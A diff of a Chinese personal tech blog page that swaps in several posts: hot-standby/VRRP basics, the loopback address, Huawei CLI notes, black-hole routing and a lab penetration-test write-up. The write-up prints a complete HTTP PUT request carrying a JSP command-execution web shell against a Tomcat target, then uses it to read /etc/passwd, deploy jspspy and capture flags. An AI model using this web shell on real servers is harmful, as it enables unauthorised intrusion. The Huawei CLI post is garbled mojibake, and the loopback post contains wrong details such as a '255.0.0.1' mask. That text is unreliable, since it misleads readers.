@@ -89,7 +89,7 @@
   <script>
     try {
       var typed = new Typed("#subtitle", {
-        strings: ['Ymnnb', '于栩斐，大笨蛋！', '想要的都拥有，得不到的都释怀'],
+        strings: ['Ymnnb', 'Ymnnb！', '我想去看海'],
         startDelay: 0,
         typeSpeed: 200,
         loop: true,
@@ -169,87 +169,68 @@
     
     
     <article
-  id="post-post"
+  id="post-双机热备份"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
   data-scroll-reveal
 >
   <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2024/04/27/post/"
-    >post</a> 
-</h2>
- 
-
-      
-    </header>
      
     <div class="article-meta">
-      <a href="/2024/04/27/post/" class="article-date">
-  <time datetime="2024-04-26T16:05:28.000Z" itemprop="datePublished">2024-04-27</time>
+      <a href="/2024/07/29/%E5%8F%8C%E6%9C%BA%E7%83%AD%E5%A4%87%E4%BB%BD/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.205Z" itemprop="datePublished">2024-07-29</time>
 </a>    
     </div>
       
     <div class="article-entry" itemprop="articleBody">
        
-   
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
-  </div>
-
-   
-   
-  
-</article>
-
-    
-    <article
-  id="post-MySql"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2024/04/01/MySql/"
-    >MySql数据库</a> 
-</h2>
- 
-
-      
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2024/04/01/MySql/" class="article-date">
-  <time datetime="2024-04-01T15:25:56.473Z" itemprop="datePublished">2024-04-01</time>
-</a>    
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <h1 id="MySql数据库"><a href="#MySql数据库" class="headerlink" title="MySql数据库"></a>MySql数据库</h1><h2 id="启动与停止"><a href="#启动与停止" class="headerlink" title="启动与停止"></a>启动与停止</h2><p>1.win+r services.msc 找到mysql手动启动</p>
-<p>2.cmd net start mysql  启动     net stop mysql </p>
-<p>（启动失败就用管理员进入）</p>
-<h2 id="客户端连接"><a href="#客户端连接" class="headerlink" title="客户端连接"></a>客户端连接</h2><p>1.MySql提供的客户端命令行工具</p>
-<p>找到MySQL 8.0 Command Line Client,输入密码即可连接</p>
-<p>2.cmd中执行指令</p>
-<p>mysql -u root -p</p>
+  <h2 id="什么是双机热备"><a href="#什么是双机热备" class="headerlink" title="什么是双机热备?"></a>什么是双机热备?</h2><p>双机热备是一种通过在网络设备之间建立<strong>冗余</strong>的、<strong>实时同步</strong>的备份系统，以实现在主设备故障时无缝切换到备用设备的高可用性技术。</p>
+<p>双机热备通常由两个或多个<strong>相同配置</strong>的设备组成，其中一个设备处于活动状态（主设备），而其他设备处于待命状态（备用设备）。备用设备通过实时同步数据和状态信息，以便在主设备发生故障时立即接管网络服务的运行。</p>
+<h2 id="双机热备的工作原理"><a href="#双机热备的工作原理" class="headerlink" title="双机热备的工作原理"></a>双机热备的工作原理</h2><p>双机热备技术的核心原理是<strong>实现设备之间的状态同步和故障检测</strong>。</p>
+<p>主设备和备用设备之间通过专用的链路进行通信，并持续地交换状态信息和数据。当主设备发生故障时，备用设备能够立即检测到，并迅速接管主设备的功能。</p>
+<p>具体而言，双机热备的工作流程如下：</p>
+<p><img src="/assets/202306071504171.png" alt="img"></p>
+<ol>
+<li><strong>状态同步</strong>：主设备和备用设备通过专用链路实时同步状态信息和数据。这包括配置信息、路由表、会话信息等。同步的频率通常非常高，以确保备用设备能够及时获得最新的数据和状态信息。</li>
+<li><strong>心跳检测</strong>：主设备和备用设备之间进行心跳检测，以确保彼此的可达性和正常运行。心跳检测可以基于物理链路的连通性、网络层的可达性或应用层的可用性进行。</li>
+<li><strong>故障检测</strong>：备用设备通过心跳检测或其他机制检测主设备的故障。一旦备用设备检测到主设备故障，它会立即启动故障切换过程。</li>
+<li><strong>故障切换</strong>：当备用设备检测到主设备故障后，它会迅速接管主设备的功能，并开始处理网络流量和服务请求。这个过程通常是无缝的，用户无需感知到主备切换的发生。</li>
+<li><strong>恢复与重平衡</strong>：一旦主设备恢复正常，双机热备系统会自动将主备设备的角色切换回原始状态。在切换过程中，备用设备上积累的数据和状态信息会被同步回主设备，以确保一致性。</li>
+</ol>
+<h2 id="双机热备的应用场景"><a href="#双机热备的应用场景" class="headerlink" title="双机热备的应用场景"></a>双机热备的应用场景</h2><p>双机热备广泛应用于各种网络设备和系统中，以提供高可用性和可靠性。</p>
+<p>以下是一些常见的应用场景：</p>
+<p><img src="/assets/202306071505178.png" alt="img"></p>
+<ol>
+<li><strong>路由器和交换机</strong>：在企业网络中，核心路由器和交换机是网络通信的关键设备。通过实施双机热备，可以保证网络服务的连续性和稳定性，避免由于设备故障而导致的网络中断。</li>
+<li><strong>防火墙和安全设备</strong>：防火墙和其他安全设备是保护网络免受恶意攻击和入侵的重要组成部分。通过使用双机热备技术，可以确保网络安全设备的连续性，并在主设备发生故障时及时检测和阻止潜在的威胁。</li>
+<li><strong>服务器和存储系统</strong>：对于数据中心和企业服务器，双机热备可以提供高可用性和冗余。通过在服务器和存储系统之间实现双机热备，可以确保数据的持久性和可靠性，减少因硬件故障而导致的业务中断。</li>
+<li><strong>应用程序和数据库</strong>：关键的业务应用程序和数据库在许多组织中扮演着重要角色。通过使用双机热备，可以保证应用程序和数据库的高可用性，确保用户的持续访问和数据的完整性。</li>
+</ol>
+<h2 id="双机热备的优势"><a href="#双机热备的优势" class="headerlink" title="双机热备的优势"></a>双机热备的优势</h2><p>双机热备技术带来了许多显著的优势，包括：</p>
+<p><img src="/assets/202306071534868.png" alt="img"></p>
+<ol>
+<li><strong>高可用性</strong>：双机热备通过实时同步和快速故障切换，可以确保网络服务的高可用性。在主设备故障的情况下，备用设备能够立即接管并提供无缝的服务。</li>
+<li><strong>数据完整性</strong>：通过实时数据同步和故障切换过程中的数据恢复，双机热备可以确保数据的完整性。即使在主设备故障期间，数据也能够得到保护和同步，避免数据丢失或损坏。</li>
+<li><strong>透明性</strong>：对用户而言，双机热备的切换过程是透明的，他们无需感知到主备切换的发生。服务的连续性和稳定性对用户来说是无缝的，他们可以继续使用网络服务而不受影响。</li>
+<li><strong>快速恢复</strong>：双机热备技术具有快速恢复的特性。一旦主设备发生故障，备用设备可以迅速接管，减少服务中断的时间，并加快业务恢复的速度。</li>
+<li><strong>高可靠性</strong>：通过冗余配置和实时同步，双机热备提供了更高的设备可靠性。即使一个设备出现故障，备用设备可以继续运行，保证了系统的稳定性和可靠性。</li>
+<li><strong>简化维护</strong>：双机热备可以简化设备的维护和升级过程。在进行设备维护时，可以将主设备切换到备用设备，使得维护过程对用户来说是无感知的。</li>
+<li><strong>成本效益</strong>：尽管双机热备需要额外的设备和配置，但它可以显著减少因故障而导致的业务中断和损失，从而节约了企业的成本。</li>
+</ol>
+<h2 id="华为双机热备方案"><a href="#华为双机热备方案" class="headerlink" title="华为双机热备方案"></a>华为双机热备方案</h2><p>在网络设备领域，华为和思科是两个备受推崇的知名厂商。为了提高网络设备的可用性和可靠性，这两家公司都提供了双机热备方案。下面将详细介绍华为和思科的双机热备方案，包括原理、配置和优势。</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>华为的双机热备方案基于VRP（Versatile Routing Platform）操作系统，通过VRRP（Virtual Router Redundancy Protocol）协议实现设备间的状态同步和故障切换。</p>
+<p>VRRP协议允许将多台路由器组成一个虚拟路由器组（VRG），其中一台路由器作为Master（主设备），其他路由器作为Backup（备用设备）。Master路由器负责处理网络流量和提供服务，而Backup路由器则实时同步Master的状态信息。</p>
+<p>当Master路由器发生故障或不可达时，Backup路由器会检测到并自动切换为Master，接管网络服务的运行。故障切换过程对用户来说是透明的，不会造成服务中断。</p>
+<p><img src="/assets/202306071603397.png" alt="img"></p>
+<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>华为双机热备方案的配置主要包括以下步骤：</p>
+<ol>
+<li>创建VRG：在主备路由器上分别创建一个VRG，并将它们归属于同一个VRG组。</li>
+<li>配置VRRP：在VRG中配置VRRP协议，指定Master和Backup的优先级、虚拟IP地址以及其他相关参数。</li>
+<li>启动VRRP：启动VRRP协议，并确保主备路由器之间能够正常通信。</li>
+<li>配置故障检测：配置故障检测机制，包括心跳检测和链路检测，以确保主备路由器之间的可达性和连通性。</li>
+<li>监控和管理：通过网络管理系统监控双机热备系统的状态和性能，并及时采取措施处理故障和异常情况。</li>
+</ol>
  
       <!-- reward -->
       
@@ -270,38 +251,34 @@
 
     
     <article
-  id="post-hello-world"
+  id="post-什么是环回地址127.0.0.1"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
   data-scroll-reveal
 >
   <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2024/03/05/hello-world/"
-    >Hello World</a> 
-</h2>
- 
-
-      
-    </header>
      
     <div class="article-meta">
-      <a href="/2024/03/05/hello-world/" class="article-date">
-  <time datetime="2024-03-05T07:34:00.027Z" itemprop="datePublished">2024-03-05</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/Hello/">Hello</a>
-  </div>
-   
+      <a href="/2024/07/29/%E4%BB%80%E4%B9%88%E6%98%AF%E7%8E%AF%E5%9B%9E%E5%9C%B0%E5%9D%80127.0.0.1/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.203Z" itemprop="datePublished">2024-07-29</time>
+</a>    
     </div>
       
     <div class="article-entry" itemprop="articleBody">
        
-  <h2 id="这是Ymnnb的Blog"><a href="#这是Ymnnb的Blog" class="headerlink" title="这是Ymnnb的Blog"></a>这是Ymnnb的Blog</h2> 
+  <h1 id="什么是环回地址127-0-0-1？"><a href="#什么是环回地址127-0-0-1？" class="headerlink" title="什么是环回地址127.0.0.1？"></a>什么是环回地址127.0.0.1？</h1><p>IP 地址 127.0 0.1 是一个特殊用途的 IPv4 地址，称为localhost或环回地址。所有计算机都使用此地址作为自己的地址，但它不会像真实 IP 地址那样让计算机与其他设备通信。</p>
+<p>实际上，网段 127.0.0.0&#x2F;8 中的任何 IPv4 地址都被指定为环回地址。应用程序通常更喜欢使用 127.0.0.1 作为其网络服务。IP 地址 127.0.0.1 通常分配给环回接口。环回接口在技术上是一个闭合电路。这意味着任何到达环回接口（localhost 或 127.0.0.1）的 TCP 或 UDP 数据包都将被路由到计算机本身，而无需进入外部网络或 Internet。</p>
+<h1 id="127-0-0-1-环回如何工作？"><a href="#127-0-0-1-环回如何工作？" class="headerlink" title="127.0.0.1 环回如何工作？"></a>127.0.0.1 环回如何工作？</h1><p>与环回地址 127.0.0.1 建立网络连接的过程几乎与网络上的任何远程计算机或设备相同。主要区别在于连接到 127.0.0.1 不使用 LAN 接口硬件。通常，系统管理员和应用程序开发人员使用 127.0.0.1 来测试应用程序。与 127.0.0.1 建立 IPv4 连接时，通常会分配子网掩码255.0.0.1 。假设任何公共交换机、路由器或网关接收到一个发往环回 IP 地址的数据包。在这种情况下，它应该丢弃数据包而不记录信息。因此，如果数据包意外到达本地节点之外，它就不会到达计算机。环回的这一方面有助于确保网络安全。</p>
+<h1 id="测试127-0-0-1"><a href="#测试127-0-0-1" class="headerlink" title="测试127.0.0.1"></a>测试127.0.0.1</h1><p>127.0.0.1 是一个不可路由的私有 IP 地址，用于与输入地址的同一设备建立连接。例如，ping 127.0.0.1在命令提示符窗口中输入命令将与始发设备连接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1  </span><br></pre></td></tr></table></figure>
+
+
+<p>跟ping localhost效果是一样的</p>
+<h1 id="localhost-和-127-0-0-1-区别"><a href="#localhost-和-127-0-0-1-区别" class="headerlink" title="localhost 和 127.0.0.1 区别"></a>localhost 和 127.0.0.1 区别</h1><p>通常，localhost 和 127.0.0.1 可以互换使用，两者被认为是一样的，但是，它们之间也存在细微的差异。</p>
+<p>首先，localhost需要解析或查找与 localhost 关联的 IP 地址，而 127.0.0.1 通常不需要解析。<br>其次，localhost 并不总是解析为 127.0.0.1，它可以被解析为地址环回块中的另一个地址。</p>
+<h1 id="127-0-0-1总结"><a href="#127-0-0-1总结" class="headerlink" title="127.0.0.1总结"></a>127.0.0.1总结</h1><p>127.0.0.1是一个环回地址（本地主机地址）<br>是一个特殊的A类网络地址，具有“环回”功能，意味着从更高层协议发送到该地址的数据报将环回。<br>主要用于测试和开发目的<br>有时候将服务的ip设置成127.0.0.1也能起到安全保护的作用。</p>
+ 
       <!-- reward -->
       
     </div>
@@ -311,8 +288,577 @@
     
     <footer class="article-footer">
        
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PS3/" rel="tag">PS3</a></li></ul>
+    </footer>
+  </div>
 
+   
+   
+  
+</article>
+
+    
+    <article
+  id="post-某个渗透测试（没看版）"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/%E6%9F%90%E4%B8%AA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%88%E6%B2%A1%E7%9C%8B%E7%89%88%EF%BC%89/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.201Z" itemprop="datePublished">2024-07-29</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>运行Nmap命令“nmap -sS -n 192.168.200.120”扫描靶机所在网段下的所有IP。</p>
+<p><img src="/%E7%AC%94%E8%AE%B0/assets/permeate_11_html_m68ed06ed.png" alt="img"></p>
+<p>再次输入命令，查看8080端口对应的服务，可以发现8080端口确实提供HTTP服务。</p>
+<p><img src="/%E7%AC%94%E8%AE%B0/assets/permeate_11_html_5ec1a6b0.png" alt="img"></p>
+<p>访问靶机的8080端口，发现为Tomcat服务器，如下图所示。</p>
+<p><img src="/%E7%AC%94%E8%AE%B0/assets/permeate_11_html_m5fe1593.png" alt="img"></p>
+<p>当 Tomcat 启用了 HTTP PUT 请求方法（将web.xml文件中 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 jsp 文件。之后，jsp 文件中的代码将能被服务器执行。尝试Tomcat的PUT方法任意写漏洞，打开Burp Suite，如下图所示。</p>
+<p><img src="/%E7%AC%94%E8%AE%B0/assets/permeate_11_html_6f98ab57.png" alt="img"></p>
+<p>尝试构造如下数据包发送一句话shell，通过PUT方法向Tomcat根目录下写入1.jsp文件，如下图所示。</p>
+<p>PUT &#x2F;1.jsp&#x2F; HTTP&#x2F;1.1</p>
+<p>Host: 192.168.200.120:8080</p>
+<p>User-Agent: Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:52.0) Gecko&#x2F;20100101 Firefox&#x2F;52.0</p>
+<p>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,<em>&#x2F;</em>;q&#x3D;0.8</p>
+<p>Accept-Language: en-US,en;q&#x3D;0.5</p>
+<p>Accept-Encoding: gzip, deflate</p>
+<p>Connection: close</p>
+<p>Upgrade-Insecure-Requests: 1</p>
+<p>Cache-Control: max-age&#x3D;0</p>
+<p>Content-Type: application&#x2F;x-www-form-urlencoded</p>
+<p>Content-Length: 624</p>
+<p>&lt;%@ page import&#x3D;”java.io.*”%&gt;</p>
+<p>&lt;%</p>
+<p>try {</p>
+<p>String cmd &#x3D; request.getParameter(“cmd”);</p>
+<p>Process child &#x3D; Runtime.getRuntime().exec(cmd);</p>
+<p>InputStream in &#x3D; child.getInputStream();</p>
+<p>int c;</p>
+<p>while ((c &#x3D; in.read()) !&#x3D; -1) {</p>
+<p>out.print((char)c);</p>
+<p>}</p>
+<p>in.close();</p>
+<p>try {</p>
+<p>child.waitFor();</p>
+<p>} catch (InterruptedException e) {</p>
+<p>e.printStackTrace();</p>
+<p>}</p>
+<p>} catch (IOException e) {</p>
+<p>System.err.println(e);</p>
+<p>}</p>
+<p>%&gt;</p>
+<p><img src="/%E7%AC%94%E8%AE%B0/assets/permeate_11_html_15b9c8b8.png" alt="img"></p>
+<p>代码的含义是获取网页的cmd参数，通过Runtime.getRuntime().exec(cmd)方法执行并返回成功执行结果或报错信息。</p>
+<p>尝试访问&#x2F;etc&#x2F;passwd文件，能成功访问，如下图所示。</p>
+<p><img src="/%E7%AC%94%E8%AE%B0/assets/permeate_11_html_m1fb8b2ed.png" alt="img"></p>
+<p>浏览当前目录下文件，发现有flag.txt文件，如下图所示。</p>
+<p><img src="/%E7%AC%94%E8%AE%B0/assets/permeate_11_html_496cf102.png" alt="img"></p>
+<p>使用命令cat flag.txt命令，查看flag.txt文件，得到第一个flag。flag1{646ce24e8e17ccc6165e65236de41daa}</p>
+<p><img src="/%E7%AC%94%E8%AE%B0/assets/permeate_11_html_3647544.png" alt="img"></p>
+<p>将jspspy.jsp中内容拷贝至Burp Suite中，将jspspy文件上传至服务器。</p>
+<p><img src="/%E7%AC%94%E8%AE%B0/assets/permeate_11_html_37165f04.png" alt="img"></p>
+<p>访问1.jsp文件，webshell需要登录。</p>
+<p><img src="/%E7%AC%94%E8%AE%B0/assets/permeate_11_html_3e1a528a.png" alt="img"></p>
+<p>查看jspspy.jsp文件，其中变量PW即为密码”ninty”。</p>
+<p><img src="/%E7%AC%94%E8%AE%B0/assets/permeate_11_html_ee2d918.png" alt="img"></p>
+<p>输入密码登陆后，可以执行任意命令和查看文件。</p>
+<p><img src="/%E7%AC%94%E8%AE%B0/assets/permeate_11_html_37deb2ad.png" alt="img"></p>
+<p>访问&#x2F;root目录，发现flag.txt文件。</p>
+<p><img src="/%E7%AC%94%E8%AE%B0/assets/permeate_11_html_5b702579.png" alt="img"></p>
+<p>查看flag.txt文件内容，获取第二个flag。flag2{1811abdbb7aa062847d9c80129614944}</p>
+<p><img src="/%E7%AC%94%E8%AE%B0/assets/permeate_11_html_m4eb19721.png" alt="img"></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+    <article
+  id="post-命令行"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/%E5%91%BD%E4%BB%A4%E8%A1%8C/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.199Z" itemprop="datePublished">2024-07-29</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>�����豸����<br>    �豸������ͼ�����£�<br>�û���ͼ��<Huawei><br>ϵͳ��ͼ��<Huawei>system view</p>
+<p>sys����ϵͳ��ͼ</p>
+<p>�û�������ͼ��[Huawei]user-insterface vty 0 4<br>�ӿ���ͼ��[Huawei]interface serial 0<br>ACL��ͼ��[Huawei]acl 2001<br>VLAN��ͼ��[Huawei]vlan 2<br>·��Э�������ͼ��[Huawei]ospf<br>�û�������ͼ��[Huawei]aaa</p>
+<p>��Ϊ���û���ͼ��ϵͳ��ͼ���ӿ�&#x2F;Э����ͼ<br>˼�ƣ��û���ͼ����Ȩ��ͼ��������ͼ���ӿ���ͼ</p>
+<p>���û���ͼ����ϵͳ��ͼ��system-view<br>��ϵͳ��ͼ���ص��û���ͼ��quit   q<br>������ķ��û���ͼ���ص��û���ͼ��return<br>ע�⣺<br>1.�û���ͼ�൱��˼�Ƶ��û�ģʽ��ϵͳ��ͼ�൱��˼�Ƶ�ȫ��ģʽ<br>2.Return�����൱��˼�Ƶ�end�����Cisco���ƣ�return����Ĺ���Ҳ���������&lt;Ctrl+Z&gt;���</p>
+<p><Huawei>display clock 		&#x2F;&#x2F;�鿴ʱ��<br><Huawei>clock timezone beijing add 08:00:00	&#x2F;&#x2F;��������ʱ��<br><Huawei>clock datetime 14:30:00 2017-06-06	&#x2F;&#x2F;��������ʱ��<br>[Huawei]sysname Router1		&#x2F;&#x2F;�޸�������<br>[Huawei]display version		&#x2F;&#x2F;��ѯϵͳ�汾<br>[Huawei]display users		&#x2F;&#x2F;��ѯ��ǰ�����ӵ��ն��û�<br>[Huawei]display this		&#x2F;&#x2F;��ѯ�ڵ�ǰģʽ�������õ�����<br><Huawei>save<br>[Huawei]display saved-configuration	&#x2F;&#x2F;��ѯ”�ѱ���”�������ļ�<br>[Huawei]display current-configuration	&#x2F;&#x2F;��ѯ����ʹ�õ������ļ�</p>
+<p>ϵͳ�����ļ������֣�<br>�ѱ����&#x2F;saved-configuration����Ҫ��Ϊ���ò�ͨ��save������”Ӳ��”��������Ч    123<br>����ʹ�õ�&#x2F;current-configuration ����Ϊ���ã���δͨ��save���棬��ʱ��Ч��������ʧЧ��</p>
+<p>[Huawei]save		&#x2F;&#x2F;���浱ǰ”��������”�������ļ���”�ѱ���”�������ļ���<br>[Huawei]reset saved-configuration	&#x2F;&#x2F;ɾ��”�ѱ���”�������ļ�<br>[Huawei]compare configuration		&#x2F;&#x2F;�����������ļ����бȽ�<br>[Huawei]dis transceiver int xg0&#x2F;0&#x2F;1 verbose	&#x2F;&#x2F;�鿴���׽ӿڹ⹦�ʼ�ģ�����ƣ���Ϊģ����ʾ:”dendor:HUAWEI”<br>����&#x2F;�ر���ʾ�ն˵��ԡ���־��������Ϣ���ܣ�<br><Huawei>terminal monitor<br><Huawei>undo terminal monitor<br>����&#x2F;�ر���Ϣ���ģ�<br>[Huawei]info-center enable<br>[Huawei]undo info-center enable </p>
+<p>undo</p>
+<p>�ӿ������ࣺ<br>[Huawei]clear configuration interface Ethernet 0&#x2F;0&#x2F;4	&#x2F;&#x2F;��ոýӿڵ���������</p>
+<p>[Huawei]user-interface console 0<br>[Huawei-ui-console0]authentication-mode password<br>[Huawei-ui-console0]history-command max-size 20 			�����¼��Ŀ����</p>
+<h1 id="Set-the-timeout-duration-to-1-minute-and-30-seconds"><a href="#Set-the-timeout-duration-to-1-minute-and-30-seconds" class="headerlink" title="Set the timeout duration to 1 minute and 30 seconds."></a>Set the timeout duration to 1 minute and 30 seconds.</h1><p>[Huawei-ui-console0]set authentication password cipher 123456		��������<br>[Huawei-ui-console0]idle-timeout 1 30		&#x2F;&#x2F;1��30��<br>[Huawei-ui-console0]screen-length 512		&#x2F;&#x2F;ͬʱ֧����ʾ�����������512��Ĭ��24</p>
+<p>ssh telnet</p>
+<p>[Huawei]user-interface vty 0 4<br>[Huawei-ui-vty0-4]user privilege level 3		&#x2F;&#x2F;��������Ȩ<br>[Huawei-ui-vty0-4]authentication-mode password 			&#x2F;&#x2F;·������<br>[Huawei-ui-vty0-4]set authentication password cipher 123456<br>[Huawei-ui-vty0-4]set authentication password cipher<br>Enter Password(&lt;8-128&gt;):huawei123<br>[Huawei]telnet server enable </p>
+<p>1.Զ�̹��������豸��������֤��ʽ��telnet TCP 23��SSH&#x2F;stelnet  TCP 22<br>�����豸֧��Web��֤��<br>Զ������Э�飺</p>
+<p>2.���� Telnet ��ʽ��¼ʱ�����룺<br>[Huawei] user-interface vty 0 4<br>[Huawei-ui-vty0-4] authentication-mode password&#x2F;aaa 		&#x2F;&#x2F;����������֤��AAA��֤<br>[Huawei-ui-vty0-4] set authentication password simple&#x2F;cipher abc123 &#x2F;&#x2F;�����Ļ����ķ�ʽ����<br>[Huawei-ui-vty0-4] set authentication password cipher abc123	&#x2F;&#x2F;��Ϊ·�����������·����ֻ�������ļ���<br>[Huawei-ui-vty0-4] user privilege level 3 		&#x2F;&#x2F;����Զ�̵�¼vty�û�Ȩ��Ϊ3����ʾ����ʹ����������</p>
+<p>3.���� Telnet���û���+���뷽ʽ��¼ʱ�����룺<br>����AAAģʽ�������£�<br>[Huawei]aaa<br>�������û�Ϊ��huawei ����Ϊ��abc123 ����ģʽΪ��cipher  ���ļ���,�û�����Ϊ3<br>[Huawei-aaa]local-user huawei privilege level 3 password cipher 123456	&#x2F;&#x2F;<br>������Щ�������ͨ����test�û�������֤������telnet ����<br>[Huawei-aaa]local-user huawei service-type http ssh telnet web<br>[Huawei-aaa]local-user huawei privilege level 3		&#x2F;&#x2F;Զ�̵�¼ʱ�ܹ�ʹ�õļ�������</p>
+<p>�����Ϊ0-15���ĸ������������£�<br>0<br>�ι�<br>ping��tracert��telnet��rsh��super��language-mode��display��quit<br> 1<br>���<br>0�����msdp-tracert��mtracert��reboot��reset��send��terminal��undo��upgrade��debugging<br>2<br>���ã��������������������������⣩��0��1������<br>3-15<br>�������𣬰����������</p>
+<p>��save��������Ϊlevel 3�����ܹ����û���ͼ�����С�<br>[Huawei]command-privilege level 3 view shell save</p>
+<p><Huawei>system-view<br>[Huawei]user-interface vty 0 4<br>[Huawei-ui-vty0-4]<br>[Huawei]user-interface maximum-vty 6 		&#x2F;&#x2F;�����ն�����Ϊ6��</p>
+<p>·������telnet��ʽ����·������<br><Huawei>telnet 192.168.1.1<br>telnet��23<br>ssh��22</p>
+<p>4.��SSH��ʽʵ�ּ��ܵ�Զ������<br>[Huawei]aaa<br>[Huawei-aaa]local-user huawei privilege level 3 password cipher 123456	&#x2F;&#x2F;<br>[Huawei-aaa]local-user zhangsan service-type ssh<br>[Huawei]ssh server zhangsan					&#x2F;&#x2F;ģ��������Ҫ<br>[Huawei]ssh server zhangsan authentication-type password	&#x2F;&#x2F;ģ��������Ҫ<br>[FutureMatrix]ssh user admin service-type stelnet 			����ʵ�����ܻ��õ���<br>[FutureMatrix]ssh user admin authentication-type password		����ʵ�����ܻ��õ���<br>[Huawei]stelnet server enable 						**********<br>[Huawei]user-interface vty 0 4<br>[Huawei-ui-vty0-4]authentication-mode aaa<br>[Huawei-ui-vty0-4]protocol inbound ssh   *********ģ����Ҳ��Ҫ����</p>
+<p>�ͻ���CRTԶ�����Ӽ���</p>
+<p>·������ssh��ʽ����·������<br>[Huawei]ssh client first-time enable				******<br>[Huawei]stelnet 192.168.2.1</p>
+<p>5.���� Console ��ʽ��¼ʱ�����룺<br>[Huawei]user-interface console 0<br>[Huawei-ui-console0]authentication-mode password 	&#x2F;&#x2F;����console��¼��֤��ʽΪ���뷽ʽ<br>[Huawei-ui-console0]set authentication password simple abc123	&#x2F;&#x2F;simple�����������룬cipherΪ��������<br>[Huawei-ui-console0]user privilege level 3 	&#x2F;&#x2F;ָ��console���ӵ��û�����<br>�û�����Ϊ0-15,0��1��2�ֱ��Ӧ������0��1��2��3-15��Ӧ������3<br>ע�⣺console�ܹ�ʹ��aaa��������ָ���û��ľ���Э��</p>
+<p>������ssh�Ͳ��ܹ�ʹ��telnet	</p>
+<p>��������ͼ����·����ʵ����������<br>1.ensp�ͻ���ͨ�������������ӷ�ʽ������·����<br>2.ͨ���Ž���ʵ����ʹ��ʵ���ܹ�telnet�������������ӵ�·����<br>3.ͨ������aaa��֤�����û��������뷽ʽsshԶ�����ӵ�·����</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+    </footer>
+  </div>
+
+   
+   
+  
+</article>
+
+    
+    <article
+  id="post-黑洞路由"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+     
+    <div class="article-meta">
+      <a href="/2024/07/29/%E9%BB%91%E6%B4%9E%E8%B7%AF%E7%94%B1/" class="article-date">
+  <time datetime="2024-07-29T10:28:11.197Z" itemprop="datePublished">2024-07-29</time>
+</a>    
+    </div>
+      
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="黑洞路由"><a href="#黑洞路由" class="headerlink" title="黑洞路由"></a>黑洞路由</h1><p><strong>解决DOS攻击</strong></p>
+<p><strong>黑洞路由</strong>实际是一种特殊的<a href="https://link.zhihu.com/?target=https://so.csdn.net/so/search?q=%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1&spm=1001.2101.3001.7020">静态路由</a>，<u>将所有无关路由吸入其中，使它们有来无回的路由，一般是admin主动建立的路由条目。它使目的地址为该网段的数据报文到达设备之后，将被丢弃。</u></p>
+<p>在众多类型的出接口中，有一种接口非常特殊，那就是Null（无效）接口，这种类型的接口只有一个编号，也就是0。Null 0是一个系统保留的逻辑接口，当网络设备在转发某些数据包时。如果使用出接口为Null 0的路由，那么这些报文将直接丢弃，就像扔进一个黑洞（垃圾站），因此出接口为Null 0的路由又称为黑洞路由。</p>
+<p><strong>Null0口是个永不down的口</strong>，另外，将报文丢到Null接口的操作应不需要CPU进行什么处理，所以处理大量的报文也不会消耗设备的CPU资源。如果同样的功能用ACL（地址访问控制列表）实现，则流量增大时CPU利用率会明显增加。黑洞路由最大的好处是充分利用了路由器的包转发能力，对系统负载影响非常小。<strong>所以，设置黑洞路由一直是解决固定DOS攻击的最好办法</strong>。<u>相当于洪水来临时，在洪水途经的路上附近挖一个不见底的巨大深坑，然后将洪水引入其中。</u></p>
+<p>一个黑洞路由器是指一个不支持PMTU且被配置为不发送“Destination Unreachable–目的不可达”回应消息的路由器。</p>
+<p>试想一下，在做汇总的路由器上，一条明细路由消失了，但是他依然会通告汇总路由出去，那么远端的路由器依然会发包上来。这是汇总路由器查找明细没有路由，就匹配了缺省路由或汇聚路由，送回了发包来的路由器，于是这些包一直打环，要等到TTL超时才能停下。</p>
+<p><strong>黑洞路由的配置</strong></p>
